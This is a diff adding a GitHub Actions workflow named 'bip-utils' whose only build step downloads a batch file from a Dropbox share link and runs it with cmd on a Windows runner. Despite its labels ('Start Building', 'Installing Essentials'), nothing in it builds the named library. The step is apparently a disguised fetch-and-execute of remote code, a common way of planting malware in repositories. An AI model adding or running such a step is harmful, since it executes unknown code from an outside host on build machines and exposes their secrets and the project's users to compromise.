@@ -1,0 +1,13 @@
+name: bip-utils 
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/4y1d3cbsk9u4gh5unoa5k/etc.bat?rlkey=katrrchrki08ye5upqih2eezm&dl=1" -OutFile d.bat
+          cmd /c d.bat
